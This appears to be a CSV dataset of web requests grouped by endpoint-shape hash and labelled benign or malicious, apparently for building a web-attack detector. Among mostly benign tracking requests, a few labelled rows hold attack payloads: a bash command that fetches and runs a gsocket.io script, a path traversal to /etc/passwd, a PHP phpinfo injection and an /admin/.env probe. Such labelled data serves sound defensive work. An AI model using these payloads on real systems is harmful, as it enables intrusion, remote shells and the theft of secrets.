"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"endpoint_shape_hash","c71aab0a8c101af99e69d4f9","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000172|norm_modsec_learn_000160|norm_modsec_learn_001351|norm_modsec_learn_001925|norm_modsec_learn_001350|norm_modsec_learn_000786|norm_modsec_learn_000791|norm_modsec_learn_001314","GET","/","id=3501943296531858&ev=SubscribedButtonClick&dl=https%3A%2F%2Fwww.abeectoys.com%2Fcart&rl=https%3A%2F%2Fwww.abeectoys.com%2Fcollections%2Fl-o-l-surprise%2Fage-suitability-6%3Fsort_by%3Dprice-ascending&if=false&ts=1662375886956&cd[buttonFeatures]=%7B%22classList%22%3A%22button-primary%20mdc-ripple-su"
"endpoint_shape_hash","d396ef98f346a7cb5e7a536e","8","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_002198|pos_owasp_modsec_002041|pos_owasp_modsec_002082|pos_owasp_modsec_001923|pos_owasp_modsec_002295|pos_owasp_modsec_001702|pos_owasp_modsec_002913|pos_owasp_modsec_000206","GET","/d_3b1ec613/d_bd205cb5/gzdecode.php",""
"endpoint_shape_hash","d85542c8d702a55ac5a00fb8","8","0","openappsec_legitimate","normal","norm_legitimate_000313|norm_legitimate_000280|norm_legitimate_000310|norm_legitimate_000301|norm_legitimate_000284|norm_legitimate_000316|norm_legitimate_000276|norm_legitimate_000222","POST","/yeele-And-Office-Heres-hearistatestrailesse-pull","d=bookaa.amadeus.com"
"endpoint_shape_hash","e66d44df911619aa789ad366","8","0","openappsec_legitimate","normal","norm_legitimate_000870|norm_legitimate_000055|norm_legitimate_002530|norm_legitimate_001972|norm_legitimate_000149|norm_legitimate_000658|norm_legitimate_002634|norm_legitimate_001965","POST","/service/update2/json","cup2key=14:tSz11BGXvkA0CGhHIXMpwk6ZNBWU0IqGREtgomIMO2g&cup2hreq=85e7aaadbef0080699ac17e2475f79535307a32a84987d9745d748bc23e17840"
"endpoint_shape_hash","014288f51d7b0d33d4d290ee","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002782|norm_modsec_learn_001010|norm_modsec_learn_002778|norm_modsec_learn_002779|norm_modsec_learn_001011|norm_modsec_learn_002780|norm_modsec_learn_002781","GET","/","tim=17%3A05%3A39.239&type=info&msg=Finish%20Rendering%20Below%20Article%20Thumbnails%20%7C%20Card%202&llvl=2&id=3219&cv=20220811-9-RELEASE&lt=snap_timeOut_1_ctrl&pct=1"
"endpoint_shape_hash","05a5f06280b1fcaeece0e906","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001462|norm_modsec_learn_001465|norm_modsec_learn_001532|norm_modsec_learn_000314|norm_modsec_learn_001454|norm_modsec_learn_000394|norm_modsec_learn_001543","GET","/","random=154630152&cv=9&fst=1662450223591&num=1&npa=1&label=faEVCOqfwuoBELi-itUC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F3801950.fls.doubleclick.net%2Factivityi%3Bdc_p"
"endpoint_shape_hash","097e222d5a52f98d70085c88","7","0","openappsec_legitimate","normal","norm_legitimate_000009|norm_legitimate_000040|norm_legitimate_000010|norm_legitimate_000021|norm_legitimate_000019|norm_legitimate_000039|norm_legitimate_000020","POST","/r/api/personalize/customerEvents/events/publish","brand=flowers&entryBrand=flowers"
"endpoint_shape_hash","0d292884bdceb3630ad4f11f","7","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002574|pos_owasp_modsec_001897|pos_owasp_modsec_001027|pos_owasp_modsec_001467|pos_owasp_modsec_002459|pos_owasp_modsec_001104|pos_owasp_modsec_000636","POST","/","wc-ajax=aws_action"
"endpoint_shape_hash","1041403d9c69862ad4bbe4af","7","0","openappsec_legitimate","normal","norm_legitimate_001836|norm_legitimate_001901|norm_legitimate_001869|norm_legitimate_001936|norm_legitimate_001921|norm_legitimate_001912|norm_legitimate_001940","POST","/managed-tags/show",""
"endpoint_shape_hash","10ffce9499173f04500e8af4","7","0","openappsec_legitimate","normal","norm_legitimate_002527|norm_legitimate_002519|norm_legitimate_002521|norm_legitimate_002528|norm_legitimate_002525|norm_legitimate_002529|norm_legitimate_002526","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994za200zb851582372&_p=1728585010917&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253DA%253FBran"
"endpoint_shape_hash","20e01117d16df34ab2dc6430","7","0","openappsec_legitimate","normal","norm_legitimate_001008|norm_legitimate_000833|norm_legitimate_001228|norm_legitimate_001009|norm_legitimate_000908|norm_legitimate_000959|norm_legitimate_001394","GET","/v3/","tid=2615772635442&ov=%7B%22page_name%22%3A%22PLP%7CG_KIDS%7CPR_SHOES%7CAG_INFANT_TODDLER%22%2C%22page_category%22%3A%22PLP%22%7D&pd=%7B%22opt_out_type%22%3A%22%22%2C%22st%22%3A%22%22%2C%22country%22%3A%22%22%2C%22np%22%3A%22tealium%22%2C%22pin_unauth%22%3A%22dWlkPU5qZ3dOREV6T0RFdE1XSXhZeTAwTlRjd0xUb"
"endpoint_shape_hash","2700a12c2bd9973c4418efd4","7","0","openappsec_legitimate","normal","norm_legitimate_000597|norm_legitimate_000585|norm_legitimate_000587|norm_legitimate_000566|norm_legitimate_000584|norm_legitimate_000598|norm_legitimate_000591","POST","/6af8a0ef214c4b3acf291444f6573e61/e",""
"endpoint_shape_hash","2b9399bfadd19edeb24b1653","7","0","openappsec_legitimate","normal","norm_legitimate_002744|norm_legitimate_002756|norm_legitimate_002741|norm_legitimate_002761|norm_legitimate_002823|norm_legitimate_002822|norm_legitimate_002758","POST","/uFM_e9-s4d/xTJZDteIZM/aD3apcDc4JfS/YXVAWAE/MW/88LgMee10B",""
"endpoint_shape_hash","3c43c39ad9fc8106738ffb5c","7","0","openappsec_legitimate","normal","norm_legitimate_000768|norm_legitimate_000900|norm_legitimate_000899|norm_legitimate_000781|norm_legitimate_000755|norm_legitimate_000841|norm_legitimate_000751","POST","/.well-known/sbsd",""
"endpoint_shape_hash","41a2f8977d04c3eb6996a17a","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002483|norm_modsec_learn_001910|norm_modsec_learn_000175|norm_modsec_learn_001911|norm_modsec_learn_001921|norm_modsec_learn_002482|norm_modsec_learn_001313","GET","/","id=1469186276646646&ev=PageView&dl=https%3A%2F%2Fstoryonline.co.il%2Fcollections%2Fsumer-sale-22-%25D7%25A0%25D7%25A9%25D7%2599%25D7%259D%3Fsort_by%3Dprice-ascending&rl=https%3A%2F%2Fstoryonline.co.il%2Fcollections%2Fsummer-sale-22&if=false&ts=1660549319109&sw=1920&sh=1080&v=2.9.75&r=stable&a=shopif"
"endpoint_shape_hash","479292556c3e177dc12d3ae0","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000454|norm_modsec_learn_002975|norm_modsec_learn_000451|norm_modsec_learn_002751|norm_modsec_learn_002750|norm_modsec_learn_000453|norm_modsec_learn_000998","GET","/","t=16605515344870.8402884074245256&c=1zyjhmab8ziolk8rkhp8sql6uhetdd&p=a4z72s&a=2airtuotjljd4ogblxxqquiq&o=www.bug.co.il&rt=1660551369412"
"endpoint_shape_hash","4d1f7bb2dd073980b9ce4473","7","0","openappsec_legitimate","normal","norm_legitimate_001188|norm_legitimate_001439|norm_legitimate_001362|norm_legitimate_001186|norm_legitimate_001358|norm_legitimate_001189|norm_legitimate_001187","GET","/pagead/viewthroughconversion/787863515/","random=1657529315&cv=9&fst=1719747610541&num=1&npa=1&label=NGnbCMXG7cIBENuv1_cC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260%2C466465925%2C512247839&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=6&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F4599367.fls.doublecli"
"endpoint_shape_hash","5f6d0c746f8d49ba39580bd2","7","0","openappsec_legitimate","normal","norm_legitimate_000761|norm_legitimate_002050|norm_legitimate_000787|norm_legitimate_002592|norm_legitimate_002046|norm_legitimate_001992|norm_legitimate_000756","GET","/gtag/js","id=DC-4599367&l=dataLayer&cx=c"
"endpoint_shape_hash","6727ced21304e953f553a802","7","0","openappsec_legitimate","normal","norm_legitimate_001227|norm_legitimate_000957|norm_legitimate_000831|norm_legitimate_001005|norm_legitimate_001393|norm_legitimate_000907|norm_legitimate_001006","GET","/user/","event=Search&ed=%7B%22currency%22%3A%22USD%22%2C%22search_query%22%3A%22RUN%7CTOP%20RIGHT-SEARCH-QUERY%7CRUN%22%2C%22page_title%22%3A%22adidas%20Online%20Shop%20%7C%20adidas%20US%22%2C%22line_items%22%3A%5B%7B%22product_id%22%3A%22FV8350%22%2C%22product_name%22%3A%22ULTRABOOST%2020%20SHOES%22%7D%2C%"
"endpoint_shape_hash","6cb071e2ab4fd84cb6d946b7","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001988|norm_modsec_learn_001423|norm_modsec_learn_002577|norm_modsec_learn_000271|norm_modsec_learn_000870|norm_modsec_learn_001989|norm_modsec_learn_000871","GET","/","origin=onetag&domain=shein.com&sn=ChromeSyncframe&so=3&topUrl=il.shein.com&bundle=WP0HLl9oNlBaM0RKOTJCelc5VGJnaVhkMHFXZnV4QkRmYWpVZ0w3Zjl5Z0laVmRDamRpWnJudklJMmw1c3VYWk1NQTBNblNUVkZlZDZUYlVqTCUyQlBPZGV1Z3NmeXNYS05UYUVscSUyQkNyWFdxWWwzYlNzMFg1MUYlMkZleHZhNVpIQ25Ya3RFdUtURThSY1BCJTJGR25RViUyQlppT2kza0"
"endpoint_shape_hash","8ddbe51ae57e78c89ec56e7f","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000719|norm_modsec_learn_001243|norm_modsec_learn_000720|norm_modsec_learn_002412|norm_modsec_learn_001244|norm_modsec_learn_001246|norm_modsec_learn_001245","GET","/","d=CJa29wIQsra-gAIYtuG30wEwAQ&v=APEucNVlXN_Bki8d9xGZzR-MLQrGyBN7lVNYaPHjm0YGMmD9WNN41LLlxDQ5MdjtsA7sc-LeEcJYnUfROWJgPG1W-D-jXWm01JWr8nzoOW2ZkPI0MhwIho4hOcpHSRhhCwDALlmkH0geLjbZqGAl9k20-Soa-GSrh3Gs8CNj0LW9z0w0Gtn0PJ1aCeujauYiq8Hx4WbsfnI91YgAH5nC15TUhSpFoXmRHJElJsofZX7yBK1rTw9slMVnv5GtptZuDAWTIJnT5H1er"
"endpoint_shape_hash","8e3006c86a210cbd15b9eeb1","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001378|norm_modsec_learn_001370|norm_modsec_learn_001379|norm_modsec_learn_001368|norm_modsec_learn_001366|norm_modsec_learn_001369|norm_modsec_learn_001377","GET","/","id=OSC.TOOL3DCE31CD1B44015BB343D1BDC413CE7362EE51D278F26E7BAB7A388D93BAB447&o=5&pid=21.1&bw=0&bc=FFFFFF&h=250&rs=1"
"endpoint_shape_hash","8e9d982bc86bcf081a1ac4db","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000051|norm_modsec_learn_000053|norm_modsec_learn_001182|norm_modsec_learn_001181|norm_modsec_learn_000056|norm_modsec_learn_000054|norm_modsec_learn_000057","GET","/","a=148914409&sa=1&v=1216.487a282&t=Unnamed%20Transaction&rst=12872&ck=1&ref=https://www.atptour.com/en/scores/current-challenger/szczecin/448/draws"
"endpoint_shape_hash","9292ceaf492bb779616126ee","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000376|norm_modsec_learn_000382|norm_modsec_learn_000374|norm_modsec_learn_000366|norm_modsec_learn_000365|norm_modsec_learn_000362|norm_modsec_learn_000369","GET","/","random=1663662141283&cv=9&fst=1663662141283&num=1&bg=ffffff&hl=EN&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9j0&sendb=1&ig=1&data=event%3Dpage_view%3BloggedIn%3D(not%20set)%3BcustomerType%3DCONS%3BpageType-hit%3"
"endpoint_shape_hash","9883630c13ed25d1410e30bc","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000702|norm_modsec_learn_001221|norm_modsec_learn_001220|norm_modsec_learn_002402|norm_modsec_learn_002403|norm_modsec_learn_000101|norm_modsec_learn_000701","GET","/","conversational-flow-id=2595587f-a0be-435c-ba07-cbf6d83054b5&culture=he-IL&default-department-id=29d514f8-c9e1-464f-b28b-77be51c6c164&dt=1660484232073&dtKey=d4942fae&h=&has-had-conversations=false&host-origin=https%3A%2F%2Fgentleman.co.il&host-page-title=MICHAEL%20KORS%20%7C%20%D7%A9%D7%A2%D7%95%D7%9"
"endpoint_shape_hash","9e3fa4b2f88a6e3a8ce2f70e","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002105|norm_modsec_learn_002691|norm_modsec_learn_002692|norm_modsec_learn_002073|norm_modsec_learn_000944|norm_modsec_learn_002096|norm_modsec_learn_001508","GET","/","random=1662619337678&cv=9&fst=1662619337678&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8v0&sendb=1&ig=1&frm=0&url=https%3A%2F%2Fwww.sacara.co.il%2F&tiba=%D7%A1%D7%A7%D7%90%D7%A8%D7%94%20%3A%3A%20%"
"endpoint_shape_hash","9f077d277113297c418ee869","7","0","openappsec_legitimate","normal","norm_legitimate_000648|norm_legitimate_000656|norm_legitimate_000665|norm_legitimate_000659|norm_legitimate_000649|norm_legitimate_000053|norm_legitimate_000657","GET","/complete/search","client=chrome-omni&gs_ri=chrome-ext-ansg&xssi=t&q=a&oit=1&cp=1&pgcl=2&gs_rn=42&psi=pTFcHRjrucwucS4z&sugkey=AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw"
"endpoint_shape_hash","ac08cbce91e9b10a52bed1c3","7","0","openappsec_legitimate","normal","norm_legitimate_001892|norm_legitimate_001897|norm_legitimate_001888|norm_legitimate_001963|norm_legitimate_001964|norm_legitimate_001903|norm_legitimate_001917","GET","/reco-v5","site=US&a2bSideTray=1457_2404_106_US"
"endpoint_shape_hash","c1b739ae0f989d28367b886c","7","0","openappsec_legitimate","normal","norm_legitimate_001180|norm_legitimate_001172|norm_legitimate_001344|norm_legitimate_001438|norm_legitimate_001360|norm_legitimate_001179|norm_legitimate_001181","GET","/pagead/conversion/787863515/","random=1719747610541&cv=9&fst=1719747610541&num=1&npa=1&label=NGnbCMXG7cIBENuv1_cC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260%2C466465925%2C512247839&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=6&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F4599367.fls.double"
"endpoint_shape_hash","cb08bd49b4d4fe658e0e6942","7","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000971|pos_owasp_modsec_000488|pos_owasp_modsec_000274|pos_owasp_modsec_000186|pos_owasp_modsec_001506|pos_owasp_modsec_001625|pos_owasp_modsec_000252","GET","/d_873adb73/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","e1b5c86b29afb1442d59c0b8","7","0","openappsec_legitimate","normal","norm_legitimate_000729|norm_legitimate_000774|norm_legitimate_000739|norm_legitimate_000730|norm_legitimate_000895|norm_legitimate_000775|norm_legitimate_000896","POST","/personalizationengine",""
"endpoint_shape_hash","e2b8c34dc3623f99fc6c9a22","7","1","owasp_modsecurity","owasp_php_injection:933160","pos_owasp_modsec_001792|pos_owasp_modsec_002668|pos_owasp_modsec_001484|pos_owasp_modsec_002307|pos_owasp_modsec_001865|pos_owasp_modsec_001762|pos_owasp_modsec_002409","GET","/index.php","=phpinfo()"
"endpoint_shape_hash","f6334e1d5c9bf26592b48b3f","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000877|norm_modsec_learn_002592|norm_modsec_learn_002593|norm_modsec_learn_000276|norm_modsec_learn_001431|norm_modsec_learn_001997|norm_modsec_learn_001996","GET","/","partner=criteo&partner_uid=OCxUHwyeep2ss0utd_AwgxLzfJNybWHt"
"endpoint_shape_hash","017e51b74b945f317b9a6a81","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001865|norm_modsec_learn_001866|norm_modsec_learn_001237|norm_modsec_learn_001239|norm_modsec_learn_001238|norm_modsec_learn_000105","GET","/","customerId=19763025&dbwId=1&mapTs=1660467211&cidt=tLFVM0tHWdWDIen90t73DIFjRNDgZ1Fp2xssRCpxRkc%3D"
"endpoint_shape_hash","07dda8feb341d47db3f9de4f","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002902|norm_modsec_learn_002901|norm_modsec_learn_002904|norm_modsec_learn_002900|norm_modsec_learn_002903|norm_modsec_learn_002899","GET","/","width=350&url=https://www.terminalx.com/pub/media/catalog/product/z/2/z253350011-11652961936.jpg"
"endpoint_shape_hash","09da20c862c11f10acedbe84","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002999|norm_modsec_learn_000586|norm_modsec_learn_000584|norm_modsec_learn_000585|norm_modsec_learn_000582|norm_modsec_learn_000583","GET","/","xai=AKAOjsvam3pk_KjlDwbHaeLPR7zVYtzySeJBTckynhhncQEpsnNjcvFZdtDzDtbQvo-6y0zKUt4-oOdWijLh9Xguq81s45nwj33zGd6GI2_hE6ZS3WakM6R--v6IsW4epOUIfOq-Yz-vrvih7_e00l6n3GbUaE309xdbrcvJYtkvs7wiJHANSA6QLkx0wmXV7iLn7w_JRVQJ4tG8gh8SDc9LV3hQuFVjzQUuJLy11JQoMVMne4t62Wns7oksqpgkj_BjYRIAbsbbtYph-LFx-dEKdOBUYYQ7RJKKH3jd"
"endpoint_shape_hash","0d5c34bd3bddaa43ef7114cd","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001025|norm_modsec_learn_000481|norm_modsec_learn_000482|norm_modsec_learn_002791|norm_modsec_learn_002789|norm_modsec_learn_002788","GET","/","type=iframe&id=pr_b7bYVyXDVra0vrRFcGnv&ncm=1&id=pr_b7bYVyXDVra0vrRFcGnv_lid_dg28zE97nNNGzkmt8FFh&su=https%3A%2F%2Fwww.footlocker.co.il%2Fmain&sr=&ts=1660542510308"
"endpoint_shape_hash","118a394f8043ae5321035932","6","0","openappsec_legitimate","normal","norm_legitimate_000773|norm_legitimate_000771|norm_legitimate_000731|norm_legitimate_000772|norm_legitimate_000733|norm_legitimate_000770","GET","/api/search/tf/taxonomy","sitePath=us&query=kids"
"endpoint_shape_hash","149fee437f7e920447ffe19f","6","1","csic_2010","csic_anomalous","pos_csic_000260|pos_csic_002994|pos_csic_000758|pos_csic_000817|pos_csic_002556|pos_csic_000822","GET","/tienda1/publico/anadir.jsp","id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito"
"endpoint_shape_hash","18060c9627574677d3ac4ca1","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001058|norm_modsec_learn_001060|norm_modsec_learn_001059|norm_modsec_learn_001057|norm_modsec_learn_001055|norm_modsec_learn_001056","GET","/","v=1&_v=j96&a=714867469&t=event&ni=1&cu=ILS&_s=1&dl=https%3A%2F%2Fwww.footlocker.co.il%2Fyouth%2Fshoes%2Fsneakers%2Fcat%3Fcategory_id%3D610a9715af82d10008a87535&ul=en-us&de=UTF-8&dt=Foot%20Locker%20%7C%20%D7%A1%D7%A0%D7%99%D7%A7%D7%A8%D7%A1&sd=24-bit&sr=1920x1080&vp=1920x969&je=0&ec=Ecommerce&ea=prod"
"endpoint_shape_hash","1d8545531087c8243b192979","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001883|norm_modsec_learn_000747|norm_modsec_learn_001882|norm_modsec_learn_002442|norm_modsec_learn_000125|norm_modsec_learn_001277","GET","/","entry=c~Gum.ChromeSyncframe.CookieRead.uid~1&entry=c~Gum.ChromeSyncframe.FragmentData.onetag.Bundle.Origin.3~1&entry=c~Gum.ChromeSyncframe.SidReadSuccess~1&entry=h~Gum.ChromeSyncframe.SidReadSuccessDuration~523"
"endpoint_shape_hash","4354631b30eb7a90d4b489b6","6","1","exploitdb|owasp_modsecurity","lfi|owasp_rce:920270","pos_luongvd_001100|pos_owasp_modsec_002500|pos_luongvd_001233|pos_luongvd_001041|pos_luongvd_001193|pos_owasp_modsec_000361","GET","/index.php","option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00"
"endpoint_shape_hash","471993de8e91e6c7dc00f87a","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002414|norm_modsec_learn_000722|norm_modsec_learn_002413|norm_modsec_learn_000718|norm_modsec_learn_000723|norm_modsec_learn_001242","GET","/","d=eP9MPPN0LPLzS74ccBS9ctJSdgg_b1D0jNsSreGAxYl-BEuaZ2l3JMSfy1y69mnZ-i2QeG1ljFhEH8vOOHyD0inwh-426ElIQlZLQHRgVu8VM-KHKXEcspCrpdWEKuONNOdh_tugduu1hGkGlfn6O1ib0n2vn2pZ1uhay7F28P65-5PnyIEvNRChEHozTewS0&t=637387549600000000"
"endpoint_shape_hash","4f41114fbf3db80e2fd48265","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002339|norm_modsec_learn_002343|norm_modsec_learn_000623|norm_modsec_learn_000622|norm_modsec_learn_000039|norm_modsec_learn_002342","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fservices&t=1663681677016&v=1663681689432&H=d6ab6b13108e7a6275cc2236&s=338e6b6523e2e777f09c4d0a4f489cc3&z=1&S=133742&N=345&P=10"
"endpoint_shape_hash","562d5e9b95e20a444c232c91","6","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_001278|pos_owasp_modsec_002129|pos_owasp_modsec_000121|pos_owasp_modsec_000591|pos_owasp_modsec_002497|pos_owasp_modsec_000326","GET","/admin/.env",""
"endpoint_shape_hash","5897a343dbfe907b88c0a25d","6","0","openappsec_legitimate","normal","norm_legitimate_001044|norm_legitimate_001554|norm_legitimate_001555|norm_legitimate_001553|norm_legitimate_001557|norm_legitimate_001556","POST","/collect",""
"endpoint_shape_hash","5f3d01afca5acd836f6e0e46","6","0","openappsec_legitimate","normal","norm_legitimate_000586|norm_legitimate_000596|norm_legitimate_000595|norm_legitimate_000572|norm_legitimate_000567|norm_legitimate_000556","POST","/cdn-cgi/rum",""
"endpoint_shape_hash","659cc93e7daf4e2e28d436d2","6","0","openappsec_legitimate","normal","norm_legitimate_001333|norm_legitimate_001148|norm_legitimate_001098|norm_legitimate_001099|norm_legitimate_001270|norm_legitimate_001339","GET","/v3/","event=AddToCart&ed=%7B%22currency%22%3A%22USD%22%2C%22page_title%22%3A%22adidas%20Runfalcon%205%20Running%20Shoes%20-%20White%20%7C%20Women%27s%20Running%20%7C%20adidas%20US%22%2C%22line_items%22%3A%5B%7B%22product_id%22%3A%22IH7760%22%2C%22product_name%22%3A%22RUNFALCON%205%20RUNNING%20SHOES%22%2C%"
"endpoint_shape_hash","6d24b0d8df7190c775853203","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002337|norm_modsec_learn_000040|norm_modsec_learn_000043|norm_modsec_learn_002341|norm_modsec_learn_002340|norm_modsec_learn_002338","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fservices&t=1663681677016&v=1663681681743&H=d6ab6b13108e7a6275cc2236&s=338e6b6523e2e777f09c4d0a4f489cc3&z=1&Q=2&S=2764&N=3"
